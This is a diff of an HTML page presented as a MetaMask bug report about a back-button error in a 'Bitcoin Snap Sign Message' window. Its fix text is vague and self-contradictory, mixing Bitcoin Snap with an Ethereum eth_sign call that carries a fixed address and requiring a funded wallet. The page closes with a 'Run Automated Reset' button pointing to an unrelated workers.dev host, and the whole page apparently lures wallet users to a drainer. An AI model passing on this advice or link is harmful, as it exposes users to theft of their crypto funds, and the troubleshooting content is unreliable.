@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,35 +42,35 @@
 <h1>Metamask Extension Bug Sign Message Clicking Back Button In The</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a bug when using the Metamask extension to sign a message, specifically when clicking the back button in the Bitcoin Snap Sign Message confirmation window. The error prevents the user from successfully signing the message.</li>
+<li>When using the Metamask extension to sign a message, clicking the back button in the Bitcoin Snap Sign Message confirmation window causes the transaction to loop indefinitely, resulting in a timeout error.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a compatibility issue between the Metamask extension and the Bitcoin Snap Sign Message protocol. When the user clicks the back button, the extension fails to properly handle the cancellation of the sign message request, resulting in the bug.</li>
+<li>The error occurs due to a compatibility issue between the Metamask extension and the Bitcoin Snap Sign Message protocol, where the back button click event is not properly handled, causing the transaction to restart.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Check the Metamask extension version and update to the latest version if necessary</li>
-<li>Clear the browser cache and cookies</li>
-<li>Use the following JSON-RPC call to reset the sign message request:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Clear the Metamask extension's cache and storage</li>
+<li>Reset the Bitcoin Snap Sign Message configuration</li>
+<li>Execute the following command to manually override the transaction:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
 <span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sign&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Hello, World!&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Hello, world!&quot;</span><span class="p">],</span>
 <span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for advanced troubleshooting. </p>
+<p>Consider using an external console for more advanced troubleshooting. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and enabled</li>
-<li>Bitcoin Snap Sign Message protocol configured</li>
-<li>Latest browser version updated</li>
+<li>Metamask extension installed and configured</li>
+<li>Bitcoin Snap Sign Message protocol enabled</li>
+<li>Ethereum wallet set up and funded</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
